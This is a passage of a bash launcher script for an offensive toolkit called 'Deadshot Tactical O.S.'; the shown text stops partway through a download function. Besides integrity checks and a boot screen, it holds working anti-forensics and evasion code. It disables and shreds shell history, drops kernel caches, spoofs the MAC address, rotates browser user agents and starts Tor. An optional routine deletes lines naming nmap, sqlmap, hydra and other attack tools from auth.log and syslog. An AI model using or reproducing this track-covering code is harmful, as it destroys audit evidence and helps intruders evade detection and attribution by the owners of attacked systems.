#!/bin/bash
export HISTFILE=/dev/null

# ==========================================
# Core Project: Deadshot Tactical O.S. (RAW)
# Developer: NE0SYNC
# ==========================================

# Integrity Lock: Obfuscated Master Keys
# These strings are hardcoded and will be checked by the compiled binary
AUTHOR_B64="TkUwU1lOQw==" # "NE0SYNC" base64
LICENSE_SHA256="REPLACE_ME_BY_BUILD_SH" # Build script will inject this

# Initialize paths before first integrity check.
SCRIPT_DIR=$(dirname "$(readlink -f "$0")")
TOOLS_DIR="${SCRIPT_DIR}/Tools"
CONFIG_FILE="${DEADSHOT_CONFIG_FILE:-${SCRIPT_DIR}/deadshot.conf}"
case "$CONFIG_FILE" in
    /*) ;;
    *) CONFIG_FILE="${SCRIPT_DIR}/${CONFIG_FILE}" ;;
esac
export DEADSHOT_CONFIG_FILE="$CONFIG_FILE"

load_secure_config() {
    local cfg="$CONFIG_FILE"
    local owner_uid perms mode

    if [ ! -f "$cfg" ]; then
        return 0
    fi

    if [ -L "$cfg" ]; then
        echo -e "\033[31;1m[!] Insecure config: symbolic links are not allowed for deadshot.conf.\033[0m"
        return 1
    fi

    owner_uid=$(stat -Lc '%u' "$cfg" 2>/dev/null)
    perms=$(stat -Lc '%a' "$cfg" 2>/dev/null)

    if [ -z "$owner_uid" ] || [ -z "$perms" ]; then
        echo -e "\033[31;1m[!] Unable to validate deadshot.conf ownership/permissions.\033[0m"
        return 1
    fi

    if [ "$owner_uid" -ne 0 ] && { [ -z "$SUDO_UID" ] || [ "$owner_uid" -ne "$SUDO_UID" ]; }; then
        echo -e "\033[31;1m[!] Insecure config owner for deadshot.conf (uid: $owner_uid).\033[0m"
        echo -e "\033[1;30m[*] Owner must be root or the invoking sudo user.\033[0m"
        return 1
    fi

    mode=$((8#$perms))
    if (( mode & 0022 )); then
        echo -e "\033[31;1m[!] Insecure config permissions on deadshot.conf ($perms).\033[0m"
        echo -e "\033[1;30m[*] Group/other write permissions are forbidden.\033[0m"
        return 1
    fi

    source "$cfg"
    return 0
}

verify_license_integrity() {
    # Robust Path Detection for Compiled Binaries
    local lic_path="${SCRIPT_DIR}/LICENSE.md"
    
    if [ ! -f "$lic_path" ] && [ -f "./LICENSE.md" ]; then
        lic_path="./LICENSE.md"
    fi

    # Check if license exists
    if [ ! -f "$lic_path" ]; then
        echo -e "\033[31;1m[!] CRITICAL: Proprietary License File Missing.\033[0m"
        echo -e "\033[1;30m[*] This tool belongs to $(echo $AUTHOR_B64 | base64 -d). Access Denied.\033[0m"
        exit 1
    fi

    # Calculate actual SHA-256 of the current license file
    CURRENT_SHA256=$(sha256sum "$lic_path" 2>/dev/null | awk '{print $1}')

    # Validate against master hash
    if [ -n "$CURRENT_SHA256" ] && [ "$LICENSE_SHA256" != "REPLACE_ME_BY_BUILD_SH" ] && [ "$CURRENT_SHA256" != "$LICENSE_SHA256" ]; then
        echo -e "\033[31;1m[!] SECURITY ALERT: License Tampering Detected!\033[0m"
        echo -e "\033[31;1m[!] You have modified or rebranded the NE0SYNC intellectual property.\033[0m"
        echo -e "\033[1;30m[*] Initiating Defensive Protocol: Self-Destructing Toolkit...\033[0m"
        
        # AGGRESSIVE MODE with path guard: never wipe if TOOLS_DIR is unsafe or unset.
        # [HARDENING] Only wipe if PRODUCTION_MODE is enabled to prevent lab accidents.
        if [ "${DEADSHOT_PROD_MODE:-0}" = "1" ] && [ -n "$TOOLS_DIR" ] && [ "$TOOLS_DIR" != "/" ] && [ "$TOOLS_DIR" != "." ] && [ "$TOOLS_DIR" != "$HOME" ]; then
            quarantine_dir="${SCRIPT_DIR}/Quarantine"
            quarantine_name="Tools_defensive_$(date +%Y%m%d_%H%M%S)"
            mkdir -p -- "$quarantine_dir" 2>/dev/null || true
            if [ -d "$TOOLS_DIR" ]; then
                mv -- "$TOOLS_DIR" "${quarantine_dir}/${quarantine_name}" 2>/dev/null || true
            fi
            mkdir -p -- "$TOOLS_DIR" 2>/dev/null
            echo -e "\033[31;1m[+] Defensive quarantine completed.\033[0m"
        else
            echo -e "\033[31;1m[!] Defensive wipe skipped: PRODUCTION_MODE disabled or unsafe path.\033[0m"
        fi
        
        echo -e "\033[31;1m[+] System locked. Rebrand attempt documented.\033[0m"
        exit 1
    fi
}

verify_release_manifest() {
    local manifest_path="${SCRIPT_DIR}/SHA256SUMS"

    if [ ! -f "$manifest_path" ] && [ -f "./SHA256SUMS" ]; then
        manifest_path="./SHA256SUMS"
    fi

    # Source/dev runs may not include a manifest; only enforce when present.
    if [ ! -f "$manifest_path" ]; then
        return 0
    fi

    # GPG signature verification — anchor against repo tampering
    local sig_path="${manifest_path}.asc"
    if [ -f "$sig_path" ]; then
        if ! gpg --verify "$sig_path" "$manifest_path" 2>/dev/null; then
            echo -e "\033[31;1m[!] SECURITY ALERT: GPG signature verification failed.\033[0m"
            echo -e "\033[31;1m[!] SHA256SUMS may have been tampered with. Aborting.\033[0m"
            exit 1
        fi
    fi

    if ! (cd "$(dirname "$manifest_path")" && sha256sum -c "$(basename "$manifest_path")" --status 2>/dev/null); then
        echo -e "\033[31;1m[!] SECURITY ALERT: Release manifest integrity check failed.\033[0m"
        echo -e "\033[31;1m[!] Runtime binaries/config were modified or corrupted.\033[0m"
        exit 1
    fi
}

# Run integrity check before anything else
verify_license_integrity
verify_release_manifest

verify_tpi_config() {
    if [[ "${DEADSHOT_PROD_MODE:-0}" == "1" ]]; then
        if [[ -z "${DEADSHOT_TPI_SECRET}" ]]; then
            echo -e "\033[31;1m[!] CRITICAL: DEADSHOT_PROD_MODE=1 mas DEADSHOT_TPI_SECRET nao definida.\033[0m"
            echo -e "\033[31;1m[!] TPI nao pode funcionar sem secret. Abortar.\033[0m"
            exit 1
        fi
        if [[ ${#DEADSHOT_TPI_SECRET} -lt 16 ]]; then
            echo -e "\033[31;1m[!] CRITICAL: DEADSHOT_TPI_SECRET demasiado curta (minimo 16 chars).\033[0m"
            exit 1
        fi
    else
        echo -e "\033[1;30m[*] AVISO: DEADSHOT_PROD_MODE nao activo — TPI em modo lab (bypass).\033[0m"
    fi
}

verify_tpi_config

export NEWT_COLORS='
    root=,black
    window=,black
    border=red,black
    shadow=,black
    button=black,red
    actbutton=white,red
    compactbutton=black,red
    title=red,black
    roottext=white,black
    textbox=white,black
    actlistbox=black,red
    listbox=white,black
'

RED='\033[31;40;1m'
DARK_GRAY='\033[1;30m'
NC='\033[0m'

# Source the external configuration if it passes ownership and permissions checks
if ! load_secure_config; then
    exit 1
fi

ENABLE_LOG_SCRUB="${ENABLE_LOG_SCRUB:-0}"
ALLOW_UNVERIFIED_DOWNLOADS="${ALLOW_UNVERIFIED_DOWNLOADS:-0}"
PHONEINFOGA_INSTALL_SHA256="${PHONEINFOGA_INSTALL_SHA256:-}"
OLLAMA_INSTALL_SHA256="${OLLAMA_INSTALL_SHA256:-}"
RUSTSCAN_DEB_SHA256="${RUSTSCAN_DEB_SHA256:-}"
SLIVER_SERVER_SHA256="${SLIVER_SERVER_SHA256:-}"
LINPEAS_SHA256="${LINPEAS_SHA256:-}"
WINPEAS_SHA256="${WINPEAS_SHA256:-}"
PROXY_ADDR="${PROXY_ADDR:-socks5h://127.0.0.1:9050}"
OPSEC_ENABLE_MAC_SPOOF="${OPSEC_ENABLE_MAC_SPOOF:-1}"
SPOOF_REQUIRED="${SPOOF_REQUIRED:-0}"
SPOOF_IFACE="${SPOOF_IFACE:-}"
SPOOF_CONNECTIVITY_CHECK="${SPOOF_CONNECTIVITY_CHECK:-1}"
SPOOF_CONNECTIVITY_TARGETS="${SPOOF_CONNECTIVITY_TARGETS:-1.1.1.1 8.8.8.8}"
OPSEC_RUNTIME_DIR="${OPSEC_RUNTIME_DIR:-/run/deadshot}"
ENABLE_PREMIUM_LOADING="${ENABLE_PREMIUM_LOADING:-1}"
PROJECT_DISPLAY_NAME="${PROJECT_DISPLAY_NAME:-DEADSHOT-RAW}"
PROJECT_CONSOLE_NAME="${PROJECT_CONSOLE_NAME:-DEADSHOT OPERATIONS CONSOLE}"
PROJECT_MOTTO="${PROJECT_MOTTO:-SECURITY AI}"

# ==========================================
# PRE-FLIGHT SYSTEM CHECKS
# ==========================================
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] EXECUTION BLOCKED: Root privileges required.${NC}"
    echo -e "${DARK_GRAY}[*] Please run the script using: sudo ./deadshot.sh${NC}"
    exit 1
fi

ORIGINAL_MAC_IFACE=""
ORIGINAL_MAC_VALUE=""
SPOOFED_MAC_VALUE=""
OPSEC_STATE_PENDING=0
OPSEC_STATE_FILE=""

# ==========================================
# SPLASH SCREEN
# ==========================================
ascii_banner() {
    clear
    echo -e "${RED}"
    echo '    ____  _________    ____  _____ __  ______  ______'
    echo '   / __ \/ ____/   |  / __ \/ ___// / / / __ \/_  __/'
    echo '  / / / / __/ / /| | / / / /\__ \/ /_/ / / / / / /   '
    echo ' / /_/ / /___/ ___ |/ /_/ /___/ / __  / /_/ / / /    '
    echo '/_____/_____/_/  |_/_____//____/_/ /_/\____/ /_/     '
    echo ""
    echo -e "${DARK_GRAY}             [ D E A D S H O T   -   R A W ]${NC}"
    echo -e "${DARK_GRAY}            +---------------------------------------+${NC}"
    echo -e "${DARK_GRAY}            |          S E C U R I T Y   A I        |${NC}"
    echo -e "${DARK_GRAY}            +---------------------------------------+${NC}"
    echo ""
    sleep 2
}

premium_boot_loading() {
    local phases=(
        "Syncing Core Engine"
        "Loading Tactical Policy"
        "Validating Module Inventory"
        "Checking Agent Readiness"
        "Stabilizing Network Posture"
        "Binding Console Navigation"
        "Rendering Operations Layout"
        "Console Ready"
    )
    local total="${#phases[@]}"
    local idx pct filled empty bar spaces engine_name

    engine_name=$(basename "$0")

    clear
    echo -e "${RED}"
    echo "   [ ${PROJECT_CONSOLE_NAME} ]"
    echo -e "${DARK_GRAY}   [ ${PROJECT_DISPLAY_NAME} | ENGINE: ${engine_name} | ${PROJECT_MOTTO} ]${NC}"
    echo -e "${NC}"

    spaces=$(printf '%*s' 25 '')
    printf "\r${DARK_GRAY}[*] %-32s [%s] %3d%%%s" "Boot Sequence Initiated" "$spaces" 0 "${NC}"
    sleep 0.15

    for idx in "${!phases[@]}"; do
        pct=$(( ( (idx + 1) * 100 ) / total ))
        filled=$(( pct / 4 ))
        empty=$(( 25 - filled ))
        bar=$(printf '%*s' "$filled" '' | tr ' ' '#')
        spaces=$(printf '%*s' "$empty" '')

        printf "\r${DARK_GRAY}[*] %-32s [%s%s] %3d%%%s" "${phases[$idx]}" "$bar" "$spaces" "$pct" "${NC}"
        sleep 0.18
    done

    echo ""
    echo -e "${DARK_GRAY}[+] ${PROJECT_DISPLAY_NAME} initialized. Launching console.${NC}"
    sleep 0.35
}

# ==========================================
# ADVANCED OPSEC: UA ROTATION & JITTER
# ==========================================
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0"
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/121.0.0.0 Safari/537.36"
)
JITTER_SEC="0.$(($RANDOM % 9 + 1))"

get_random_ua() {
    if [ "${#USER_AGENTS[@]}" -eq 0 ]; then
        echo "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        return
    fi
    echo "${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
}

get_runtime_jitter() {
    # DEFAULT_JITTER_SECS supports explicit values (e.g., 0.9) or "random".
    if [ -n "$DEFAULT_JITTER_SECS" ] && [ "$DEFAULT_JITTER_SECS" != "random" ]; then
        echo "$DEFAULT_JITTER_SECS"
    else
        echo "$JITTER_SEC"
    fi
}

is_enabled() {
    case "${1,,}" in
        1|true|yes|on)
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

init_opsec_runtime() {
    local candidate="$OPSEC_RUNTIME_DIR"
    local fallback

    case "$candidate" in
        /run|/run/*|/tmp|/tmp/*)
            ;;
        *)
            candidate="/run/deadshot"
            ;;
    esac

    if ! mkdir -p "$candidate" 2>/dev/null || ! chmod 700 "$candidate" 2>/dev/null; then
        fallback=$(mktemp -d /tmp/deadshot_runtime.XXXXXX 2>/dev/null)
        if [ -z "$fallback" ] || [ ! -d "$fallback" ]; then
            echo -e "${RED}[!] Unable to initialize secure OPSEC runtime directory.${NC}"
            return 1
        fi
        chmod 700 "$fallback" 2>/dev/null
        candidate="$fallback"
    fi

    OPSEC_RUNTIME_DIR="$candidate"
    OPSEC_STATE_FILE="$OPSEC_RUNTIME_DIR/opsec_state.env"
    return 0
}

write_opsec_state() {
    local old_umask

    if [ -z "$OPSEC_STATE_FILE" ]; then
        return 1
    fi

    old_umask=$(umask)
    umask 077
    cat > "$OPSEC_STATE_FILE" <<EOF
OPSEC_STATE_PENDING=${OPSEC_STATE_PENDING:-0}
ORIGINAL_MAC_IFACE=${ORIGINAL_MAC_IFACE}
ORIGINAL_MAC_VALUE=${ORIGINAL_MAC_VALUE}
SPOOFED_MAC_VALUE=${SPOOFED_MAC_VALUE}
UPDATED_AT=$(date +%s)
EOF
    umask "$old_umask"
    return 0
}

clear_opsec_state() {
    if [ -n "$OPSEC_STATE_FILE" ]; then
        rm -f -- "$OPSEC_STATE_FILE" 2>/dev/null
    fi
}

load_opsec_state_field() {
    local key="$1"

    if [ -z "$OPSEC_STATE_FILE" ] || [ ! -f "$OPSEC_STATE_FILE" ]; then
        return 1
    fi

    grep -E "^${key}=" "$OPSEC_STATE_FILE" 2>/dev/null | head -n1 | cut -d= -f2-
}

restore_mac_for_iface() {
    local iface="$1"
    local expected_mac="$2"
    local current_mac

    if [ -z "$iface" ] || [ -z "$expected_mac" ]; then
        return 1
    fi

    if ! command -v macchanger >/dev/null 2>&1; then
        return 1
    fi

    if [ ! -e "/sys/class/net/$iface/address" ]; then
        return 1
    fi

    sudo ip link set dev "$iface" down 2>/dev/null
    if ! sudo macchanger -m "$expected_mac" "$iface" >/dev/null 2>&1; then
        sudo macchanger -p "$iface" >/dev/null 2>&1 || true
    fi
    sudo ip link set dev "$iface" up 2>/dev/null

    current_mac=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
    [ -n "$current_mac" ] && [ "$current_mac" = "$expected_mac" ]
}

recover_stale_opsec_state() {
    local pending saved_iface saved_original current_mac

    init_opsec_runtime || return 1

    if [ ! -f "$OPSEC_STATE_FILE" ]; then
        return 0
    fi

    if [ -L "$OPSEC_STATE_FILE" ]; then
        rm -f -- "$OPSEC_STATE_FILE"
        return 0
    fi

    pending=$(load_opsec_state_field "OPSEC_STATE_PENDING")
    saved_iface=$(load_opsec_state_field "ORIGINAL_MAC_IFACE")
    saved_original=$(load_opsec_state_field "ORIGINAL_MAC_VALUE")

    if [ "$pending" != "1" ] || [ -z "$saved_iface" ] || [ -z "$saved_original" ]; then
        clear_opsec_state
        return 0
    fi

    current_mac=$(cat "/sys/class/net/$saved_iface/address" 2>/dev/null)
    if [ -z "$current_mac" ]; then
        clear_opsec_state
        return 0
    fi

    if [ "$current_mac" = "$saved_original" ]; then
        clear_opsec_state
        return 0
    fi

    echo -e "${DARK_GRAY}[*] Recovering stale OPSEC session state on interface $saved_iface...${NC}"
    if restore_mac_for_iface "$saved_iface" "$saved_original"; then
        echo -e "${DARK_GRAY}[+] Recovered original MAC from stale state ($saved_iface).${NC}"
        clear_opsec_state
    else
        echo -e "${RED}[!] Failed to recover stale MAC state on $saved_iface.${NC}"
    fi

    return 0
}

check_spoof_connectivity() {
    local target

    if ! is_enabled "$SPOOF_CONNECTIVITY_CHECK"; then
        return 0
    fi

    if ! command -v ping >/dev/null 2>&1; then
        echo -e "${DARK_GRAY}[*] ping not available; skipping post-spoof connectivity check.${NC}"
        return 0
    fi

    for target in $SPOOF_CONNECTIVITY_TARGETS; do
        if ping -c 1 -W 2 "$target" >/dev/null 2>&1; then
            return 0
        fi
    done

    return 1
}

# ==========================================
# TEAR-DOWN & CLEANUP
# ==========================================
clean_exit() {
    local restored_mac

    clear
    echo -e "${DARK_GRAY}[*] Initiating tear-down sequence...${NC}"
    
    if is_enabled "${ENABLE_OPSEC:-0}" && [ "${DEADSHOT_TOR_STARTED:-0}" = "1" ] && command -v tor >/dev/null; then
        echo -e "${DARK_GRAY}[*] Stopping Tor proxy service...${NC}"
        sudo service tor stop >/dev/null 2>&1
    fi

    if [ -n "$ORIGINAL_MAC_IFACE" ] && [ -n "$ORIGINAL_MAC_VALUE" ]; then
        if command -v macchanger >/dev/null; then
            echo -e "${DARK_GRAY}[*] Restoring original hardware MAC on $ORIGINAL_MAC_IFACE...${NC}"
            if restore_mac_for_iface "$ORIGINAL_MAC_IFACE" "$ORIGINAL_MAC_VALUE"; then
                restored_mac=$(cat "/sys/class/net/$ORIGINAL_MAC_IFACE/address" 2>/dev/null)
                echo -e "${DARK_GRAY}[+] MAC restore confirmed on $ORIGINAL_MAC_IFACE (${restored_mac}).${NC}"
                OPSEC_STATE_PENDING=0
                clear_opsec_state
            else
                echo -e "${RED}[!] Failed to restore MAC on $ORIGINAL_MAC_IFACE (expected $ORIGINAL_MAC_VALUE).${NC}"
                OPSEC_STATE_PENDING=1
                write_opsec_state >/dev/null 2>&1 || true
            fi
        fi
    fi

    # Kill the Shield daemon if running
    if [ -f "$SCRIPT_DIR/.shield_pid" ]; then
        SHIELD_PID=$(cat "$SCRIPT_DIR/.shield_pid")
        kill "$SHIELD_PID" 2>/dev/null
        rm -f "$SCRIPT_DIR/.shield_pid"
        echo -e "${DARK_GRAY}[*] Shield daemon terminated.${NC}"
    fi
    pkill -f "deadshot_shield" 2>/dev/null
    pkill -f "TauntHandler" 2>/dev/null

    if [ "$ENABLE_LOG_SCRUB" = "1" ]; then
        read -r -p "[!] CONFIRM log scrub — this is irreversible. Type YES to proceed: " _scrub_confirm
        if [ "$_scrub_confirm" = "YES" ]; then
            echo -e "${DARK_GRAY}[*] Log scrub explicitly enabled by config. Applying scrub rules...${NC}"
            for scrub_term in deadshot nmap nuclei sqlmap hydra ffuf wpscan nikto rustscan amass sherlock netexec responder hashcat wifite; do
                sudo sed -i "/$scrub_term/Id" /var/log/auth.log 2>/dev/null
                sudo sed -i "/$scrub_term/Id" /var/log/syslog 2>/dev/null
            done
        else
            echo -e "${DARK_GRAY}[*] Log scrub aborted by operator.${NC}"
        fi
    else
        echo -e "${DARK_GRAY}[*] Log scrub disabled (default) to preserve audit integrity.${NC}"
    fi
    echo -e "${DARK_GRAY}[+] Operations concluded cleanly. Exit.${NC}"
    exit 0
}

# ==========================================
# ANTI-FORENSICS & OPSEC (INITIALIZATION)
# ==========================================
anti_forensics() {
    local IFACE NEW_MAC

    ascii_banner
    echo -e "${DARK_GRAY}[*] Initializing OPSEC protocols...${NC}"
    sleep 1

    if ! init_opsec_runtime; then
        if is_enabled "$SPOOF_REQUIRED"; then
            echo -e "${RED}[!] OPSEC runtime init failed and SPOOF_REQUIRED=1.${NC}"
            return 1
        fi
    fi
    
    unset HISTSIZE
    unset HISTFILESIZE

    sudo sh -c "echo 3 > /proc/sys/vm/drop_caches" 2>/dev/null
    sudo sh -c "echo 0 > /proc/sys/vm/oom_dump_tasks" 2>/dev/null
    
    if [ -f ~/.bash_history ]; then
        shred -u ~/.bash_history 2>/dev/null
    fi
    
    if is_enabled "$OPSEC_ENABLE_MAC_SPOOF"; then
        if [ -n "$SPOOF_IFACE" ]; then
            IFACE="$SPOOF_IFACE"
        else
            IFACE=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $5}' | head -n 1)
        fi

        if [ -n "$IFACE" ] && [ "$IFACE" != "lo" ] && [ -e "/sys/class/net/$IFACE/address" ]; then
            ORIGINAL_MAC_IFACE="$IFACE"
            ORIGINAL_MAC_VALUE=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null)
            if command -v macchanger >/dev/null; then
                echo -e "${DARK_GRAY}[*] Spoofing MAC address on interface $IFACE...${NC}"
                sudo ip link set dev "$IFACE" down
                if ! sudo macchanger -r "$IFACE" >/dev/null 2>&1; then
                    echo -e "${RED}[!] MAC spoofing failed on interface $IFACE.${NC}"
                    sudo ip link set dev "$IFACE" up
                    if is_enabled "$SPOOF_REQUIRED"; then
                        return 1
                    fi
                else
                    sudo ip link set dev "$IFACE" up
                    NEW_MAC=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null)
                    if [ -n "$ORIGINAL_MAC_VALUE" ] && [ -n "$NEW_MAC" ]; then
                        if [ "$NEW_MAC" = "$ORIGINAL_MAC_VALUE" ]; then
                            echo -e "${RED}[!] MAC spoof verification failed: interface kept original MAC ($NEW_MAC).${NC}"
                            if is_enabled "$SPOOF_REQUIRED"; then
                                return 1
                            fi
                        else
                            SPOOFED_MAC_VALUE="$NEW_MAC"
                            OPSEC_STATE_PENDING=1
                            write_opsec_state >/dev/null 2>&1 || true
                            echo -e "${DARK_GRAY}[+] MAC changed: $ORIGINAL_MAC_VALUE -> $NEW_MAC${NC}"

                            if ! check_spoof_connectivity; then
                                echo -e "${RED}[!] Connectivity check failed after MAC spoof on $IFACE.${NC}"
                                if is_enabled "$SPOOF_REQUIRED"; then
                                    echo -e "${DARK_GRAY}[*] Reverting MAC due to fail-closed policy...${NC}"
                                    if restore_mac_for_iface "$ORIGINAL_MAC_IFACE" "$ORIGINAL_MAC_VALUE"; then
                                        OPSEC_STATE_PENDING=0
                                        clear_opsec_state
                                    else
                                        OPSEC_STATE_PENDING=1
                                        write_opsec_state >/dev/null 2>&1 || true
                                    fi
                                    return 1
                                fi
                            fi
                        fi
                    fi
                fi
            else
                echo -e "${RED}[!] macchanger not found. Install dependencies via Core Menu.${NC}"
                if is_enabled "$SPOOF_REQUIRED"; then
                    return 1
                fi
            fi
        else
            echo -e "${RED}[!] Spoof interface unavailable (${IFACE:-none}).${NC}"
            if is_enabled "$SPOOF_REQUIRED"; then
                return 1
            fi
        fi
    else
        echo -e "${DARK_GRAY}[*] MAC spoofing disabled by OPSEC_ENABLE_MAC_SPOOF.${NC}"
    fi

    if is_enabled "${OPSEC_ENABLE_TOR:-0}"; then
        echo -e "${DARK_GRAY}[*] Starting local Tor tunnel...${NC}"
        if command -v tor >/dev/null; then
            sudo service tor start >/dev/null 2>&1
            export DEADSHOT_TOR_STARTED=1
        else
            echo -e "${RED}[!] Tor service missing. Install dependencies via Core Menu.${NC}"
        fi
    fi

    echo -e "${DARK_GRAY}[+] OPSEC setup complete.${NC}"
    sleep 2
}

if [ -z "$DEADSHOT_OPSEC" ]; then
    recover_stale_opsec_state >/dev/null 2>&1 || true
fi

if is_enabled "${ENABLE_OPSEC:-0}" && [ -z "$DEADSHOT_OPSEC" ] && [ -z "$1" ]; then
    if ! anti_forensics; then
        echo -e "${RED}[!] OPSEC initialization failed and execution is blocked by policy.${NC}"
        exit 1
    fi
fi

# Reuse running Shield daemon if already alive
if [ -f "$SCRIPT_DIR/.shield_pid" ]; then
    EXISTING_SHIELD_PID=$(cat "$SCRIPT_DIR/.shield_pid" 2>/dev/null)
    if [ -n "$EXISTING_SHIELD_PID" ] && kill -0 "$EXISTING_SHIELD_PID" 2>/dev/null; then
        export DEADSHOT_SHIELD_ACTIVE=1
        echo -e "${DARK_GRAY}[*] Shield daemon already active (PID: $EXISTING_SHIELD_PID). Reusing existing process.${NC}"
    else
        rm -f "$SCRIPT_DIR/.shield_pid"
    fi
fi

# Auto-start Shield daemon in background (silent guardian)
if is_enabled "${AUTO_START_SHIELD:-0}" && [ -z "$DEADSHOT_SHIELD_ACTIVE" ]; then
    SHIELD_BIN="$SCRIPT_DIR/deadshot_shield"
    SHIELD_SCRIPT="$SCRIPT_DIR/deadshot_shield.sh"
    
    export DEADSHOT_SHIELD_ACTIVE=1
    echo -e "${DARK_GRAY}[*] Deploying Shield daemon in background...${NC}"
    if [ -x "$SHIELD_BIN" ]; then
        "$SHIELD_BIN" daemon &
    else
        bash "$SHIELD_SCRIPT" daemon &
    fi
    echo $! > "$SCRIPT_DIR/.shield_pid"
    echo -e "${DARK_GRAY}[+] Shield AI Guardian is now watching your back silently.${NC}"
    sleep 1
fi

mkdir -p "$TOOLS_DIR"

prepare_tools_dir() {
    clear
    if ! cd "$TOOLS_DIR"; then
        echo -e "${RED}[!] Critical error: Tools directory $TOOLS_DIR is inaccessible.${NC}"
        sleep 2
        return 1
    fi
    return 0
}

pause_menu() {
    cd "$SCRIPT_DIR" || exit
    echo ""
    read -p "Press [ENTER] to return to main menu..."
}

verify_clone_commit() {
    local repo_dir="$1"
    local expected_pin="$2"
    local repo_name
    repo_name=$(basename "$repo_dir")

    if [[ -z "$expected_pin" ]]; then
        echo -e "${DARK_GRAY}[!] COMMIT PIN: sem pin configurado para ${repo_name} — a continuar.${NC}"
        return 0
    fi

    if [[ ! -d "${repo_dir}/.git" ]]; then
        echo -e "${RED}[!] COMMIT PIN: ${repo_name} não é um repositório git válido.${NC}"
        return 1
    fi

    local actual
    actual=$(git -C "$repo_dir" rev-parse HEAD 2>/dev/null)

    if [[ -z "$actual" ]]; then
        echo -e "${RED}[!] COMMIT PIN: falha ao ler HEAD de ${repo_name}.${NC}"
        return 1
    fi

    if [[ "$actual" != "$expected_pin" ]]; then
        echo -e "${RED}[!] COMMIT PIN MISMATCH: ${repo_name}${NC}"
        echo -e "${RED}    esperado: ${expected_pin}${NC}"
        echo -e "${RED}    actual:   ${actual}${NC}"
        echo -e "${RED}    Supply chain comprometida ou repo actualizado. Verifica manualmente.${NC}"
        return 1
    fi

    echo -e "${DARK_GRAY}[*] Commit PIN OK: ${repo_name} @ ${actual:0:12}${NC}"
    return 0
}

run_isolated() {
    local label="$1"
    shift
    (
        ulimit -u 200
        ulimit -n 1024
        ulimit -t 300
        "$@"
    )
    local exit_code=$?
    if [[ $exit_code -ne 0 ]]; then
        echo -e "${DARK_GRAY}[*] ${label} terminou com exit code ${exit_code}.${NC}"
    fi
    return $exit_code
}

# ==========================================
# AUTO-REPORTING ENGINE
# ==========================================
mkdir -p "$SCRIPT_DIR/Reports"
log_output() {
    local tool_name="$1"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local report_file="$SCRIPT_DIR/Reports/${tool_name}_${timestamp}.txt"
    # Strip ANSI color codes before saving to produce clean readable reports
    tee >(sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' > "$report_file")
    echo -e "\n${DARK_GRAY}[+] Report Auto-Saved: Reports/${tool_name}_${timestamp}.txt${NC}"
}

safe_download() {
    local url="$1"
    local output_path="$2"
    local expected_sha="$3"
    local artifact_name="$4"
    local actual_sha

    expected_sha=$(echo "$expected_sha" | tr '[:upper:]' '[:lower:]')

    if [ -z "$expected_sha" ] && [ "$ALLOW_UNVERIFIED_DOWNLOADS" != "1" ]; then
        echo -e "${RED}[!] Missing SHA256 for $artifact_name. Refusing unverified download.${NC}"
        echo -e "${DARK_GRAY}[*] Set checksum in deadshot.conf or set ALLOW_UNVERIFIED_DOWNLOADS=1 (not recommended).${NC}"
        return 1
    fi

